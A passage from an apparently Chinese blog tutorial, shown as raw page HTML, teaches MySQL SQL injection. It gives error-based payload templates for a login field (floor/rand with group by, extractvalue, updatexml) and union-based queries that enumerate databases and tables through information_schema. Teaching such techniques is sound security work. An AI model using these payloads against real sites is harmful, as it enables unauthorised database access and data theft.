<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
count() 统计元祖的个数（相当于求和）
如select count(*) from information_schema.tables;  

rand()用于产生一个0~1的随机数  

floor()向下取整  

group by 依据我们想要的规矩对结果进行分组  

concat将符合条件的同一列中的不同行数据拼接，以逗号隔开</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c327f284791344-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c327f284791344-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c327f284791344-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c327f284791344-4">4</div>
<div class="crayon-num" data-line="crayon-587a9554c327f284791344-5">5</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c327f284791344-6">6</div>
<div class="crayon-num" data-line="crayon-587a9554c327f284791344-7">7</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c327f284791344-8">8</div>
<div class="crayon-num" data-line="crayon-587a9554c327f284791344-9">9</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c327f284791344-10">10</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c327f284791344-1">
<span class="crayon-e">count</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>统计元祖的个数（相当于求和）</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c327f284791344-2">如<span class="crayon-e">select </span><span class="crayon-e">count</span><span class="crayon-sy">(</span><span class="crayon-o">*</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-e">from </span><span class="crayon-v">information_schema</span><span class="crayon-sy">.</span><span class="crayon-v">tables</span><span class="crayon-sy">;</span><span class="crayon-h">  </span>
</div>
<div class="crayon-line" id="crayon-587a9554c327f284791344-3"> </div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c327f284791344-4">
<span class="crayon-e">rand</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span>用于产生一个<span class="crayon-cn">0</span><span class="crayon-o">~</span><span class="crayon-cn">1</span>的随机数<span class="crayon-h">  </span>
</div>
<div class="crayon-line" id="crayon-587a9554c327f284791344-5"> </div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c327f284791344-6">
<span class="crayon-e">floor</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span>向下取整<span class="crayon-h">  </span>
</div>
<div class="crayon-line" id="crayon-587a9554c327f284791344-7"> </div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c327f284791344-8">
<span class="crayon-e">group </span><span class="crayon-i">by</span><span class="crayon-h"> </span>依据我们想要的规矩对结果进行分组<span class="crayon-h">  </span>
</div>
<div class="crayon-line" id="crayon-587a9554c327f284791344-9"> </div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c327f284791344-10">
<span class="crayon-i">concat</span>将符合条件的同一列中的不同行数据拼接，以逗号隔开</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->
<p></p>
<h3 id="用于错误回显的sql语句">用于错误回显的sql语句</h3>
<p><strong>第一种： 基于 rand() 与 group by 的错误</strong></p>
<p>利用group by part of rand() returns duplicate key error这个bug，关于rand()函数与group by 在mysql中的错误报告如下：</p>
<p><strong>RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.<br>
You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.</strong></p>
<p>这个bug会爆出duplicate key这个错误，然后顺便就把数据偷到了。<br>
公式：<strong>username=admin’ and (select 1 from (select count(<em>), concat(floor(rand(0)</em>2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) and ‘1’ = ‘1</strong></p>
<p><strong>第二种： XPATH爆信息</strong></p>
<p>这里主要用到的是ExtractValue()和UpdateXML()这2个函数，由于mysql 5.1以后提供了内置的XML文件解析和函数，所以这种注入只能用于5.1版本以后使用</p>
<p>查看sql手册</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3285847785151" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
语法：EXTRACTVALUE (XML_document, XPath_string);
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3285847785151-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3285847785151-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c3285847785151-3">3</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3285847785151-1">语法：<span class="crayon-e">EXTRACTVALUE</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">XML_document</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">XPath_string</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3285847785151-2">第一个参数：<span class="crayon-v">XML</span><span class="crayon-sy">_</span>document是<span class="crayon-t">String</span>格式，为<span class="crayon-i">XML</span>文档对象的名称，文中为<span class="crayon-i">Doc</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3285847785151-3">第二个参数：<span class="crayon-e">XPath_string</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">Xpath</span>格式的字符串<span class="crayon-sy">)</span><span class="crayon-h"> </span>，如果不了解<span class="crayon-i">Xpath</span>语法，可以在网上查找教程。</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p>作用：从目标XML中返回包含所查询值的字符串</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3288409876106" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
语法:UPDATEXML (XML_document, XPath_string, new_value);
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
第三个参数：new_value，String格式，替换查找到的符合条件的数据</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3288409876106-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3288409876106-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c3288409876106-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3288409876106-4">4</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3288409876106-1">语法<span class="crayon-o">:</span><span class="crayon-e">UPDATEXML</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">XML_document</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">XPath_string</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">new_value</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3288409876106-2">第一个参数：<span class="crayon-v">XML</span><span class="crayon-sy">_</span>document是<span class="crayon-t">String</span>格式，为<span class="crayon-i">XML</span>文档对象的名称，文中为<span class="crayon-i">Doc</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3288409876106-3">第二个参数：<span class="crayon-e">XPath_string</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">Xpath</span>格式的字符串<span class="crayon-sy">)</span><span class="crayon-h"> </span>，如果不了解<span class="crayon-i">Xpath</span>语法，可以在网上查找教程。</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3288409876106-4">第三个参数：<span class="crayon-v">new</span><span class="crayon-sy">_</span>value，<span class="crayon-t">String</span>格式，替换查找到的符合条件的数据</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p>作用：改变文档中符合条件的节点的值</p>
<p>现在就很清楚了，我们只需要不满足XPath_string(Xpath格式)就可以了，但是由于这个方法只能爆出32位，所以可以结合mid来使用<br>
公式1：<strong>username=admin’ and (extractvalue(1, concat(0x7e,(你想获取的数据的sql语句)))) and ‘1’=’1</strong><br>
公式2：<strong>username=admin’ and (updatexml(1, concat(0x7e,(你想获取的数据的sql语句)),1)) and ‘1’=’1</strong></p>
<p>基于错误回显的注入，总结起来就一句话，通过sql语句的矛盾性来使数据被回显到页面上，但有时候局限于回显只能回显一条，导致基于错误的注入偷数据的效率并没有那么高，但相对于布尔注入已经提高了一个档次。</p>
<h2 id="union-query-injection">union query injection</h2>
<p>要了解union query injection，首先得了解union查询，union用于合并两个或更多个select的结果集。比如说</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c328b366446917" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
SELECT username, password FROM account;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-587a9554c328b366446917-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-587a9554c328b366446917-1">
<span class="crayon-e">SELECT </span><span class="crayon-v">username</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">password </span><span class="crayon-e">FROM </span><span class="crayon-v">account</span><span class="crayon-sy">;</span>
</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p>结果是</p>
<p><code>admin 123456</code></p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3290787507913" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
SELECT id, title FROM article</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-587a9554c3290787507913-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-587a9554c3290787507913-1">
<span class="crayon-e">SELECT </span><span class="crayon-v">id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">title </span><span class="crayon-e">FROM </span><span class="crayon-v">article</span>
</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>的结果是</p>
<p><code>1 Hello, World</code></p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3293851150230" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
SELECT username, password FROM account
UNION 
SELECT id, title FROM article</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3293851150230-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3293851150230-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c3293851150230-3">3</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3293851150230-1">
<span class="crayon-e">SELECT </span><span class="crayon-v">username</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">password </span><span class="crayon-e">FROM </span><span class="crayon-e">account</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3293851150230-2"><span class="crayon-e">UNION </span></div>
<div class="crayon-line" id="crayon-587a9554c3293851150230-3">
<span class="crayon-e">SELECT </span><span class="crayon-v">id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">title </span><span class="crayon-e">FROM </span><span class="crayon-v">article</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>的结果就是</p>
<p><code>admin 123456</code></p>
<p><code>1 Hello, World</code></p>
<p>比起多重嵌套的boolean注入，union注入相对轻松。因为，union注入可以直接返回信息而不是布尔值。<strong>前面的介绍看出把union会把结果拼拼到一起，所有要让union前面的查询返回一个空值，一般采用类似于id=-1的方式。</strong></p>
<p>1)</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3296060652961" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
mysql&gt; select name from students where id = -1 union select schema_name from information_schema.schemata;   //数据库名  
+--------------------+
| name               |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| rumRaisin          |
| t3st               |
| test               |
+--------------------+
6 rows in set (0.00 sec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3296060652961-1">1</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3296060652961-2">2</div>
<div class="crayon-num" data-line="crayon-587a9554c3296060652961-3">3</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3296060652961-4">4</div>
<div class="crayon-num" data-line="crayon-587a9554c3296060652961-5">5</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3296060652961-6">6</div>
<div class="crayon-num" data-line="crayon-587a9554c3296060652961-7">7</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3296060652961-8">8</div>
<div class="crayon-num" data-line="crayon-587a9554c3296060652961-9">9</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3296060652961-10">10</div>
<div class="crayon-num" data-line="crayon-587a9554c3296060652961-11">11</div>
<div class="crayon-num crayon-striped-num" data-line="crayon-587a9554c3296060652961-12">12</div>
</div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;">
<div class="crayon-line" id="crayon-587a9554c3296060652961-1">
<span class="crayon-v">mysql</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">select </span><span class="crayon-e">name </span><span class="crayon-e">from </span><span class="crayon-e">students </span><span class="crayon-e">where </span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">union </span><span class="crayon-e">select </span><span class="crayon-e">schema_name </span><span class="crayon-e">from </span><span class="crayon-v">information_schema</span><span class="crayon-sy">.</span><span class="crayon-v">schemata</span><span class="crayon-sy">;</span><span class="crayon-h">   </span><span class="crayon-c">//数据库名  </span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3296060652961-2">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3296060652961-3">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-h">               </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3296060652961-4">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3296060652961-5">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">information_schema</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3296060652961-6">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">mysql</span><span class="crayon-h">              </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3296060652961-7">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">performance_schema</span><span class="crayon-h"> </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3296060652961-8">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">rumRaisin</span><span class="crayon-h">          </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3296060652961-9">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">t3st</span><span class="crayon-h">               </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3296060652961-10">
<span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">test</span><span class="crayon-h">               </span><span class="crayon-o">|</span>
</div>
<div class="crayon-line" id="crayon-587a9554c3296060652961-11">
<span class="crayon-o">+</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">--</span><span class="crayon-o">+</span>
</div>
<div class="crayon-line crayon-striped-line" id="crayon-587a9554c3296060652961-12">
<span class="crayon-cn">6</span><span class="crayon-h"> </span><span class="crayon-e">rows </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">set</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00</span><span class="crayon-h"> </span><span class="crayon-v">sec</span><span class="crayon-sy">)</span>
</div>
</div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0024 seconds] -->
<p>2)</p>
<!-- Crayon Syntax Highlighter v2.7.1.1 -->

		<div id="crayon-587a9554c3299396108811" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;">
<div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div>
<div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div>
</div>
</div>
			<div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
mysql&gt; select name from students where id = -1 union select table_name from information_schema.tables where table_schema='t3st';    //表名
+----------+
| name     |
+----------+
| master   |
| students |
+----------+
2   rows in set (0.00 sec)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;">
<div class="crayon-num" data-line="crayon-587a9554c3299396108811-1">1</div>
